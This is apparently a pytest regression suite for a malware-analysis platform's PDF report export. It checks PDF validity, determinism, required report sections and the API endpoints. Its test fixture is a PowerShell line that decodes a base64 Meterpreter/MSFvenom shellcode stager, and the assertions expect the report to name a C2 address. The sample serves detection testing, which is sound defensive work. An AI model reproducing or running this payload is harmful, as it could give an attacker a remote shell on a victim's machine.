"""RC2.0 · PDF export regression tests.

Locks the PDF renderer contract so future refactors cannot silently break
customer-facing report downloads.

Contract
--------
1. Valid PDF header (%PDF-1.x)
2. Byte-stable across identical inputs (metadata stripped)
3. Contains critical intelligence text (family name, IOC, MITRE)
4. Reachable via POST /api/v2/analyze/report?fmt=pdf
5. Unknown / malformed fmt still rejected
6. Legacy fmt (md / json / txt) untouched — backwards compat
"""
from __future__ import annotations
import os

import io

import pypdf
import pytest
from fastapi.testclient import TestClient

METERPRETER = (
    "[Byte[]]$var_code = [System.Convert]::FromBase64String("
    "'38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEf"
    "IvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsH"
    "IvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2"
    "yyMjIyMS3HR0dHR0Sxl1WoTc9sqHIyMjeBLqcnJJIHJyS5giIyNwc0t0qrzl3PZzyq8jIyN4"
    "EvFxSyMR46dxcXFwcXNLyHYNGNz2quWg4HNLoxAjI6rDSSdzSTx1S1ZlvaXc9nwS3HR0Sdxw"
    "dUsOJTtY3Pam4yyn6SIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTD"
    "KNz2nCMMIyMa5FYke3PKWNzc3BLcyrIiIyPK6iIjI8tM3NzcDGZ5dEUjSEwodIgEoJKXg6X5"
    "qzPHl1iO1buG+VuC6rtpnoH41qg2+GNzdpA2TdUXolH+tJ/mUO65byu/dx/NX5qstEl/1Pmp"
    "WeplO0fErSN2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMY"
    "A3RKTUdMVFADbXcDFQ0SGAN3UUpHRk1XDBYNExgDYWxqZhoYc3dhcQouKSP4VpuFSK7RM6YY"
    "oEWg5NP6S9kDRy7v1+9l6XvafZkG84FqmRudQNMHNVeEM9WPDUrPGzBH2tZZpMkasn6vGEqp"
    "NpUUjihiQnkd4eovJ5UwNNWBtXdWBhJ7ISLKZq6AwYNoC+D0hbjBx8myxeQl7sj9hecL1KkJ"
    "uU2mb+lDhPXgV+QPHbyNyxgW2LAdGXKMGjAwRDJfHspTfpmzbTfjpGaZreF0vnnOmPUrC+Qo"
    "YqNMVtUlkoRz/PZlPTWZ+1fLS6OregYTdGzqEFvmcEtE2vxec7qhtWIjS9OWgXXc9kljSyMz"
    "IyNLIyNjI3RLe4dwxtz2sJojIyMjIvpycKrEdEsjAyMjcHVLMbWqwdz2puNX5agkIuCm41bG"
    "e+DLqt7c3BIXGg0RGw0bEg0SGiMjIyMg')"
)


@pytest.fixture(scope="module")
def client():
    import sys
    sys.path.insert(0, "/app/backend")
    from server import app
    with TestClient(app) as c:
        yield c


@pytest.fixture(scope="module")
def token(client):
    r = client.post("/api/auth/login", json={
        "email": "admin@nivxray.com", "password": os.environ.get("ADMIN_PASSWORD", "")
    })
    assert r.status_code == 200
    return r.json()["access_token"]


@pytest.fixture(scope="module")
def hdr(token):
    return {"Authorization": f"Bearer {token}"}


class TestPdfRendererUnit:
    def test_pure_renderer_produces_valid_pdf(self):
        from engine import AnalysisContext, Budget, Orchestrator
        from engine.report_pdf import to_pdf
        r = Orchestrator(AnalysisContext(budget=Budget(max_depth=6, wall_time_ms=4000))).run(METERPRETER)
        pdf = to_pdf(r)
        assert isinstance(pdf, bytes)
        assert pdf.startswith(b"%PDF-"), f"Bad PDF header: {pdf[:8]!r}"
        # Should not be pathologically small (< 3 KB means content missing)
        assert len(pdf) > 3000, f"PDF suspiciously small: {len(pdf)} bytes"

    def test_pdf_is_byte_stable_across_runs(self):
        """Same input → identical bytes (metadata stripped for diffability)."""
        from engine import AnalysisContext, Budget, Orchestrator
        from engine.report_pdf import to_pdf
        r1 = Orchestrator(AnalysisContext(budget=Budget(max_depth=6, wall_time_ms=4000))).run(METERPRETER)
        r2 = Orchestrator(AnalysisContext(budget=Budget(max_depth=6, wall_time_ms=4000))).run(METERPRETER)
        # Force trace timings to same values so PDF text is comparable
        for s in r2.trace:
            s.exec_ms = r1.trace[r2.trace.index(s)].exec_ms if s in r1.trace else 0
        pdf1 = to_pdf(r1)
        pdf2 = to_pdf(r1)  # same report, twice — must be identical
        assert pdf1 == pdf2, "PDF renderer is not deterministic on identical report"

    def test_pdf_contains_key_intelligence(self):
        from engine import AnalysisContext, Budget, Orchestrator
        from engine.report_pdf import to_pdf
        r = Orchestrator(AnalysisContext(budget=Budget(max_depth=6, wall_time_ms=4000))).run(METERPRETER)
        pdf = to_pdf(r)
        reader = pypdf.PdfReader(io.BytesIO(pdf))
        text = "\n".join((p.extract_text() or "") for p in reader.pages)
        assert "149.28.81.19" in text, "C2 IP missing from PDF"
        assert "Meterpreter" in text or "MSFvenom" in text, "Family missing"
        assert "T1027" in text, "MITRE T1027 missing"
        assert "MALICIOUS" in text.upper()
        assert "powershell.exe" in text.lower() or "powershell" in text.lower()

    def test_pdf_has_all_required_sections_and_branding(self):
        """RC2.0 acceptance gate — every required section + branded logo present."""
        from engine import AnalysisContext, Budget, Orchestrator
        from engine.report_pdf import to_pdf
        r = Orchestrator(AnalysisContext(budget=Budget(max_depth=6, wall_time_ms=4000))).run(METERPRETER)
        pdf = to_pdf(r)
        reader = pypdf.PdfReader(io.BytesIO(pdf))
        text = "\n".join((p.extract_text() or "") for p in reader.pages)
        required_sections = [
            "NivXRay MCIP",                # branded wordmark logo
            "Malware Command Intelligence Platform",  # tagline
            "Executive Summary",
            "Verdict",
            "Why This Score",              # explainable confidence
            "Malware Family",
            "Decode Timeline",
            "Indicators of Compromise",
            "MITRE ATT&CK Mapping",
            "LOLBAS Detection",
            "Recommended Investigation Steps",
            "Plugin Execution Report",
            "Final Decoded Output",
            # Metadata block
            "Product",
            "Engine",
            "Schema Version",
            "Layers Decoded",
        ]
        missing = [s for s in required_sections if s not in text]
        assert not missing, f"PDF missing required sections: {missing}"


class TestPdfApi:
    def test_pdf_export_endpoint(self, client, hdr):
        r = client.post("/api/v2/analyze/report?fmt=pdf", headers=hdr,
                        json={"input": METERPRETER})
        assert r.status_code == 200
        assert r.headers["content-type"].startswith("application/pdf")
        assert r.headers["content-disposition"].endswith('.pdf"')
        assert r.content.startswith(b"%PDF-")
        assert len(r.content) > 3000
        # Parse and confirm content
        reader = pypdf.PdfReader(io.BytesIO(r.content))
        text = "\n".join((p.extract_text() or "") for p in reader.pages)
        assert "149.28.81.19" in text
        assert "Meterpreter" in text or "MSFvenom" in text

    def test_pdf_export_plaintext_case(self, client, hdr):
        """Payload with no findings still produces a valid PDF."""
        r = client.post("/api/v2/analyze/report?fmt=pdf", headers=hdr,
                        json={"input": "hello world plain text"})
        assert r.status_code == 200
        assert r.content.startswith(b"%PDF-")
        assert len(r.content) > 1500

    def test_unknown_format_still_rejected(self, client, hdr):
        r = client.post("/api/v2/analyze/report?fmt=docx", headers=hdr,
                        json={"input": METERPRETER})
        assert r.status_code == 400


class TestBackwardsCompatUnbroken:
    """RC1 fmt=md / json / txt must return byte-identical shape as before."""

    def test_markdown_still_works(self, client, hdr):
        r = client.post("/api/v2/analyze/report?fmt=md", headers=hdr,
                        json={"input": METERPRETER})
        assert r.status_code == 200
        assert r.headers["content-type"].startswith("text/markdown")
        assert "149.28.81.19" in r.text

    def test_json_still_works(self, client, hdr):
        r = client.post("/api/v2/analyze/report?fmt=json", headers=hdr,
                        json={"input": METERPRETER})
        assert r.status_code == 200
        assert r.headers["content-type"].startswith("application/json")

    def test_txt_still_works(self, client, hdr):
        r = client.post("/api/v2/analyze/report?fmt=txt", headers=hdr,
                        json={"input": METERPRETER})
        assert r.status_code == 200
        assert r.headers["content-type"].startswith("text/plain")
